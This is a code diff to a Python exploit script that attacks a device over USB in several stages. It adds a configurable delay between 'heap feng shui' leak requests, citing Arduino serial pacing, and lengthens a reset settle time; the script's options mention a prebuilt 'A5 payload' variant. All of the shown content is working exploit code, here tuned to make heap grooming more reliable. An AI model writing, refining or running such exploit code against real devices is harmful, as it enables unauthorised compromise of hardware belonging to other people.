@@ -453,7 +453,7 @@ def stage0(usb):
         reset_and_release(usb, handle, settle=0.5)
 
 
-def stage1(usb, serial_idx, leak_count, spin_us, debug):
+def stage1(usb, serial_idx, leak_count, spin_us, leak_delay_ms, debug):
     print('== stage 1: heap feng shui (%d leak requests) ==' % leak_count)
     dev, handle, desc, _ = acquire(usb, want_serial=False)
     usb.ctrl(handle, 0x02, 3, 0, 0x80, None, 10)  # stall (expected to error)
@@ -468,11 +468,16 @@ def stage1(usb, serial_idx, leak_count, spin_us, debug):
         req_debug = debug and (attempts <= 3 or attempts % 100 == 0)
         if heap_feng_shui_req(usb, handle, serial_idx, 0x80, spin_us, req_debug):
             success += 1
+        # The Arduino prints a serial line per request; that pacing matters.
+        if leak_delay_ms:
+            time.sleep(leak_delay_ms / 1000.0)
         if attempts % 100 == 0:
             print('  %d/%d' % (success, leak_count))
     heap_feng_shui_req(usb, handle, serial_idx, 0x81, spin_us, debug)  # no leak
+    if leak_delay_ms:
+        time.sleep(leak_delay_ms / 1000.0)
     print('  feng shui done (%d attempts)' % attempts)
-    reset_and_release(usb, handle, settle=0.5)
+    reset_and_release(usb, handle, settle=1.0)
 
 
 def stage2(usb, spin_us, out_spin_us, debug):
@@ -621,7 +626,7 @@ def exploit(args):
     serial_idx = desc.iSerialNumber
 
     if args.stage in ('all', '1'):
-        stage1(usb, serial_idx, args.leak, args.spin_us, args.debug)
+        stage1(usb, serial_idx, args.leak, args.spin_us, args.leak_delay_ms, args.debug)
     if args.stage in ('all', '2'):
         stage2(usb, args.spin_us, args.out_spin_us, args.debug)
     if args.stage in ('all', '3'):
@@ -660,6 +665,8 @@ def main():
                         help='prebuilt A5 payload variant (default: classic)')
     parser.add_argument('--leak', type=int, default=A5_LEAK_COUNT,
                         help='heap feng shui leak count (default: %(default)s)')
+    parser.add_argument('--leak-delay-ms', type=float, default=2.0,
+                        help='delay between feng shui requests, milliseconds (default: %(default)s)')
     parser.add_argument('--spin-us', type=int, default=80,
                         help='cancel delay for abandoned IN transfers, microseconds (default: %(default)s)')
     parser.add_argument('--out-spin-us', type=int, default=0,
